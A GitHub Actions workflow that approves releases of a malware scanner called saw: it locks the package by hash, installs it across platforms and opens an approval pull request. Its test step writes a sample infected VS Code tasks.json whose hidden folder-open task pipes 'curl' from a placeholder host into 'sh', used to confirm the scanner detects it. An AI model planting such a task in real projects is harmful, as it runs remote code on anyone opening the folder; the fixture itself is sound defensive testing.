name: approve-saw

# Approves a saw release for the extension's channel without an extension release. It locks saw
# and every dependency by hash, installs that lock on each platform saw ships for, checks the
# installed saw finds a known infection, and opens a pull request. Merging it is the approval.

on:
  workflow_dispatch:
    inputs:
      version:
        description: saw release to approve, such as 0.18.0
        required: true
        type: string
      min_extension:
        description: Oldest extension version that reads this saw
        required: true
        type: string
      security:
        description: It fixes a detection gap or a vulnerability, so it installs without the 3-day wait
        type: boolean
        default: false
      allow_unattested:
        description: Approve files PyPI has no provenance for. Only after checking the release yourself
        type: boolean
        default: false

permissions:
  contents: read

concurrency:
  group: approve-saw
  cancel-in-progress: false

jobs:
  lock:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7.1.0
        with:
          python-version: "3.12"
      - name: Install the tools, pinned by hash
        run: python -m pip install --disable-pip-version-check --require-hashes --only-binary=:all: -r .github/approve-saw/tools.txt
      - name: Verify, lock and record the release
        env:
          VERSION: ${{ inputs.version }}
          MIN_EXTENSION: ${{ inputs.min_extension }}
          SECURITY: ${{ inputs.security }}
          ALLOW_UNATTESTED: ${{ inputs.allow_unattested }}
        run: |
          flags=()
          [ "$SECURITY" = "true" ] && flags+=(--security)
          [ "$ALLOW_UNATTESTED" = "true" ] && flags+=(--allow-unattested)
          python .github/approve-saw/approve.py --version "$VERSION" --min-extension "$MIN_EXTENSION" "${flags[@]}"
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: channel
          path: channel/
          if-no-files-found: error

  try:
    needs: lock
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, ubuntu-24.04-arm, macos-latest]
        python: ["3.11", "3.14"]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: channel
          path: channel/
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7.1.0
        with:
          python-version: ${{ matrix.python }}
      - name: Install the lock as the extension does, and check the saw it installs
        env:
          VERSION: ${{ inputs.version }}
        run: |
          python -m venv "$RUNNER_TEMP/saw"
          "$RUNNER_TEMP/saw/bin/python" -m pip install --disable-pip-version-check --no-input --require-hashes --no-deps --only-binary=:all: -r "channel/locks/$VERSION.txt"
          "$RUNNER_TEMP/saw/bin/saw" --version | grep -F "saw (stayawakebot) $VERSION"
          mkdir -p "$RUNNER_TEMP/infected/.vscode" "$RUNNER_TEMP/clean"
          printf '%s' '{"version":"2.0.0","tasks":[{"label":"setup","type":"shell","command":"curl -s https://example.invalid/p.sh | sh","runOptions":{"runOn":"folderOpen"},"presentation":{"reveal":"never"}}]}' > "$RUNNER_TEMP/infected/.vscode/tasks.json"
          printf '# notes\n' > "$RUNNER_TEMP/clean/README.md"
          set +e
          "$RUNNER_TEMP/saw/bin/saw" scan "$RUNNER_TEMP/infected" --json > /dev/null; infected=$?
          "$RUNNER_TEMP/saw/bin/saw" scan "$RUNNER_TEMP/clean" --json > /dev/null; clean=$?
          set -e
          echo "infected sample: exit $infected (want 1); clean sample: exit $clean (want 0)"
          [ "$infected" = 1 ] && [ "$clean" = 0 ]

  propose:
    needs: try
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: channel
          path: channel/
      - name: Open the approval pull request
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION: ${{ inputs.version }}
          SECURITY: ${{ inputs.security }}
          ALLOW_UNATTESTED: ${{ inputs.allow_unattested }}
        run: |
          branch="approve-saw-$VERSION"
          git config user.name "github-actions[bot]"
          git config user.email "41898283+github-actions[bot]@users.noreply.github.com"
          git switch -c "$branch"
          git add channel/
          git commit -m "channel: approve saw $VERSION"
          git push --force origin "$branch"
          provenance="Every file has provenance from saw's release workflow, verified against Ndevu12/stayAwakeBot."
          [ "$ALLOW_UNATTESTED" = "true" ] && provenance="**Some files have no provenance on PyPI.** This was approved with allow_unattested."
          gh pr create --base main --head "$branch" --title "Approve saw $VERSION for the extension's channel" --body "$(printf '%s\n\n%s\n\n%s\n\n%s\n' \
            "Merging this approves saw $VERSION. Editors with \`saw.autoUpdate\` set to \`auto\` install it $( [ "$SECURITY" = "true" ] && echo "at once (security release)" || echo "3 days after its release" ), and anyone can install it sooner with Update Now." \
            "$provenance" \
            "The lock pins saw and every dependency by hash. It installed and found a known infection on Linux x64, Linux arm64 and macOS, with Python 3.11 and 3.14." \
            "Release notes: https://github.com/Ndevu12/stayAwakeBot/releases/tag/v$VERSION")" || echo "A pull request for $branch is already open; it now has this run's lock."
